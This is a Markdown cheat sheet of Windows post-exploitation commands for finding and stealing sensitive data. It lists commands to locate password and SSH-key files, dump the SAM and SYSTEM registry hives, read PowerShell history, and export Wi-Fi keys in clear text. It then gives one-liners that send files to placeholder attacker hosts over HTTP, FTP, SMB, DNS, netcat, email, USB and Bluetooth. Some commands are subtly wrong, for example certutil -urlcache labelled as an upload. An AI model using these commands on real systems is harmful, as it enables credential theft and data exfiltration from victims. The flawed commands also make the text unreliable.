# Data Collection

#### File System Search

Search for Configuration Files:

```
dir C:\*.conf /s
```

Search for Log Files:

```
dir C:\*.log /s
```

Search for Files with "password" in the Name:

```
dir C:\*password* /s
```

Search for SSH Keys:

```
dir C:\Users\*.ssh /s
```

#### Copying Sensitive Files

Copy File to a Temporary Directory:

```
copy C:\path\to\sensitivefile.txt C:\Temp\sensitivefile_copy.txt
```

Copy System File (e.g., SAM File):

```
copy C:\Windows\System32\config\SAM C:\Temp\SAM_copy
```

Copy Web Server Configuration File:

```
copy C:\inetpub\wwwroot\web.config C:\Temp\webconfig_copy.config
```

#### Archiving Data

Create a ZIP Archive Using Batch Scripting (Requires third-party `zip` utility):

```
zip -r C:\Temp\sensitive_data.zip C:\Temp\sensitivefile_copy.txt
```

#### Gathering Credentials

Extract Passwords from Configuration Files:

```
findstr /i "password" C:\inetpub\wwwroot\web.config
```

Read Command History (CMD History):

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Dump Local SAM Database (Requires SYSTEM Privileges):

```
reg save HKLM\SAM C:\Temp\SAM_dump.hiv
reg save HKLM\SYSTEM C:\Temp\SYSTEM_dump.hiv
```

# File Obfuscation and Stealth Techniques

#### File Encryption (Using `cipher` Utility)

Encrypt a Directory:

```
cipher /e /s:C:\Temp
```

#### Data Encoding (Base64)

Base64 Encode a File Using `certutil`:

```
certutil -encode C:\Temp\sensitivefile_copy.txt C:\Temp\encoded_file.txt
```

#### Fileless Data Exfiltration

Send Data to a Remote Server Using `curl` (if available):

```
curl -X POST -d @C:\Temp\sensitivefile_copy.txt http://<remote_ip>/upload
```

# Data Exfiltration via Standard Protocols

#### HTTP/HTTPS

Upload Data via HTTP POST:

```
certutil -urlcache -split -f http://<remote_ip>/uploadfile C:\Temp\sensitivefile_copy.txt
```

#### FTP

Exfiltrate Files Using FTP:

```
ftp -s:ftp_commands.txt
```

Content of `ftp_commands.txt`:

```
open <remote_ip>
username
password
put C:\Temp\sensitivefile_copy.txt
bye
```

#### SMB

Copy Data to a Remote SMB Share:

```
net use X: \\<remote_ip>\share /user:<username> <password>
copy C:\Temp\sensitivefile_copy.txt X:\
net use X: /delete
```

#### DNS

Exfiltrate Data Using DNS Queries:

```
nslookup -type=txt <data>.<attack_domain>
```

# Data Exfiltration via Public Services

#### Email

Send Email with Attachment Using `blat` (Third-party utility):

```
blat -to victim@example.com -subject "Exfiltrated Data" -body "Data in attachment" -attach C:\Temp\sensitivefile_copy.txt -server <smtp_server> -u <username> -pw <password>
```

# Data Exfiltration via SQL Databases

#### SQL Server (MSSQL)

Exfiltrate Data Using SQLCMD (Requires SQLCMD utility):

```
sqlcmd -S <server_ip> -U <username> -P <password> -Q "SELECT * FROM <table_name>" -o C:\Temp\mssql_data.txt
```

#### MySQL

Exfiltrate Data Using MySQL Command Line (Requires `mysql` utility):

```
mysql -h <server_ip> -u <username> -p<password> -D <database_name> -e "SELECT * FROM <table_name>" > C:\Temp\mysql_data.txt
```

# Data Exfiltration via Physical Media

#### USB Drive Exfiltration

Automatically Copy Data to USB When Inserted:

```
for /f "tokens=2 delims=:" %i in ('wmic volume get driveletter^, label ^| findstr USB') do copy C:\Temp\sensitivefile_copy.txt %i:\
```

# Data Exfiltration via Wireless

#### Wi-Fi Networks

Export Wi-Fi Profiles and Exfiltrate:

```
netsh wlan export profile folder=C:\Temp key=clear
```

#### Bluetooth

Exfiltrate Data via Bluetooth (Requires `btsend` or `obexftp` utility):

```
btsend <target_mac> C:\Temp\sensitivefile_copy.txt
```

# Data Exfiltration via Non-Standard Protocols

#### Netcat (if available)

Send Data Over Netcat:

```
type C:\Temp\sensitivefile_copy.txt | nc <attack_ip> <attack_port>
```

#### Covert DNS Exfiltration

Exfiltrate Data via DNS in Chunks:

```
for /f "delims=" %i in ('certutil -encode C:\Temp\sensitivefile_copy.txt') do nslookup %i.<attack_domain>
```
